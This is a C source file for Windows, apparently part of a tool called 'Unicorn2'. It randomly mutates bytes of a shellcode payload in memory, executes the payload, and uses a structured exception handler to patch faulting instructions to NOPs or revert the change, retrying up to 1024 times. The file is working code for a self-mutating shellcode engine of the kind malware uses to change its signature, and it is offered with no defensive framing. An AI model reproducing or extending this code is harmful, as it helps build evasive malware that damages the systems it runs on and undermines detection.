#include <stdio.h>
#include <Windows.h>

#include "Unicorn2.h"

UINT8 BackupBuf[x86MaxInsLen] = { 0x0 };

LONG revert_code_handle(EXCEPTION_POINTERS* ep)
{
    UINT8 *RIP = (UINT8*)ep->ContextRecord->Rip;
    printf("Exception Caught! RIP = %p\n", (void*)RIP);
    switch (ep->ExceptionRecord->ExceptionCode)
    {   
        case EXCEPTION_ILLEGAL_INSTRUCTION:
            printf("- Illegal Instruction Exception Caught!\n");
            break;
        case EXCEPTION_PRIV_INSTRUCTION:
            printf("- Privileged Instruction Exception Caught!\n");
            break;
        case EXCEPTION_INT_DIVIDE_BY_ZERO:
            printf("- Divide By Zero Exception Caught!\n");
            break;
        case EXCEPTION_BREAKPOINT:
            printf("- Breakpoint Exception Caught!\n");
            break;
        case EXCEPTION_ACCESS_VIOLATION:
            printf("- Access Violation Exception Caught!\n");
            break;
        default:
            printf("- Other Exception Caught! Code: 0x%X\n", ep->ExceptionRecord->ExceptionCode);
    }
    if (RIP >= nextPayloadBuf && RIP < nextPayloadBuf + NextPayloadSize)
    {
        printf("    - Lucky, RIP still in range, patch: %x -> NOP\n", *RIP);
        *RIP = 0x90; // NOP
    }
    else
    {
        printf("    - Oh no, RIP out of range, revert code\n");
        for(int i=0; i<x86MaxInsLen; i++)
        {
            nextPayloadBuf[MuPos + i] = BackupBuf[i];
        }
    }
    return EXCEPTION_EXECUTE_HANDLER;
}

void MuNxtPayload()
{
    for(int count=0; count<1024; count++)
    {
        printf("Finding Liveable Mutation Position...\n");
        MuWatchDog = time(NULL);
        MuPos = Get_Hardware_Rand() % (NextPayloadSize - 8 - x86MaxInsLen) + 8; // Keep first 8 bytes
        for(int i=0; i<x86MaxInsLen; i++)
        {
            BackupBuf[i] = nextPayloadBuf[MuPos + i];
            nextPayloadBuf[MuPos + i] = Get_Hardware_Rand() & 0xFF;
            if (nextPayloadBuf[MuPos + i] == 0xC3)
            {
                printf("revert RET instruction\n");
                nextPayloadBuf[MuPos + i] = BackupBuf[i];
            }
        }
        __try
        {
            ((void(*)())(nextPayloadBuf + 8))();
            printf("Mutation Success @ 0x%X\n", MuPos);
            return;
        }
        __except(revert_code_handle(GetExceptionInformation()))
        {
            printf("Shellcode Ran Into Exception, Handled\n");
        }
    }
    printf("Mutation Failed: max trial exceed\n");
}